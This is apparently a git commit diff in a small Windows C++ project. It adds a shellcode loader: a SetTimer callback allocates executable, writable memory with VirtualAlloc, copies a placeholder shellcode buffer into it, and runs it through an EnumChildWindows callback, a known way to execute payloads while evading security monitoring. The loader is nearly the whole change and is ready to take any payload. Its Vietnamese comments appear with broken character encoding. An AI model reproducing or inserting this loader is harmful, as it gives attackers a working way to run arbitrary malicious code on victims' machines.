54d77e8dc6834323ca8592a2a90cd8c46ed5256d
Pawn3r <anduu150620@gmail.com>
2024-03-29 09:43:24 +0700

    SetTimer function

--- ConsoleApplication1/ConsoleApplication1/ConsoleApplication1.cpp
+++ ConsoleApplication1/ConsoleApplication1/ConsoleApplication1.cpp
@@ -9,7 +9,22 @@ UINT_PTR SetTimer(
   TIMERPROC lpTimerFunc     // Con tr? ??n hàm g?i l?i
 );
 */
+VOID CALLBACK TimerProc(HWND hWnd, UINT message, UINT_PTR timerId, DWORD dwTime);
+char shellcode[] = "your shellcode here";
 
 int main() {
-	UNIT_PTR timerID = SetTimer()
+	UINT_PTR timerId = SetTimer(NULL, 1, 10000, TimerProc);
+	MSG msg;
+	while (GetMessage(&msg, NULL, 0, 0)) {
+		TranslateMessage(&msg);
+		DispatchMessage(&msg);
+	}
+	KillTimer(NULL, timerId);
+	return 0;
+}
+// Function Executed by TimerProc
+VOID CALLBACK TimerProc(HWND hWnd, UINT message, UINT_PTR timerId, DWORD dwTime) {
+	HANDLE hAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	memcpy(hAlloc, shellcode, sizeof(shellcode));
+	EnumChildWindows((HWND)NULL, (WNDENUMPROC)hAlloc, NULL);
 }
